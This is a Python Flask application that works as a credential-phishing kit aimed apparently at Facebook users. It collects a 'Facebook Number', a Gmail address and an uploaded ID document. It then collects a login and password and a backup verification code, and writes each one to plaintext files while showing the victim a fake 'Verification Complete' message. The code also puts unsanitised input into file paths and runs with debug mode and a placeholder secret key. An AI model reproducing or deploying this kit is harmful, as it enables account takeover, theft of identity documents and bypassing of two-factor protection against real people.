from flask import Flask, render_template, request, redirect, url_for, flash
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'

UPLOAD_FOLDER = 'submissions'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_number = request.form.get('fb_number')
    gmail = request.form.get('gmail')
    file = request.files.get('file')

    if not fb_number or not gmail or not file:
        flash("❌ All required fields must be filled.")
        return redirect(url_for('index'))

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{UPLOAD_FOLDER}/Form_{fb_number}_{timestamp}.txt"

    with open(filename, 'w') as f:
        f.write(f"Facebook Number: {fb_number}\n")
        f.write(f"Gmail: {gmail}\n")

    file_ext = os.path.splitext(file.filename)[1]
    saved_path = os.path.join(UPLOAD_FOLDER, f"ID_{fb_number}_{timestamp}{file_ext}")
    file.save(saved_path)

    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ''
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            error = "❌ Email/Phone and Password are required!"
            return render_template('login.html', error=error)

        # Save login info
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        with open(f"{UPLOAD_FOLDER}/Login_{username}_{timestamp}.txt", 'w') as f:
            f.write(f"Username: {username}\nPassword: {password}\n")

        # Simulate login success
        return redirect(url_for('backup'))

    return render_template('login.html', error=error)

@app.route('/backup', methods=['GET', 'POST'])
def backup():
    error = ''
    if request.method == 'POST':
        backup_code = request.form.get('backup_code')

        if not backup_code:
            error = "❌ Backup code is required!"
            return render_template('backup.html', error=error)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        with open(f"{UPLOAD_FOLDER}/Backup_{timestamp}.txt", 'w') as f:
            f.write(f"Backup Code: {backup_code}\n")

        return "✅ Verification Complete!"

    return render_template('backup.html', error=error)

if __name__ == '__main__':
    app.run(debug=True)
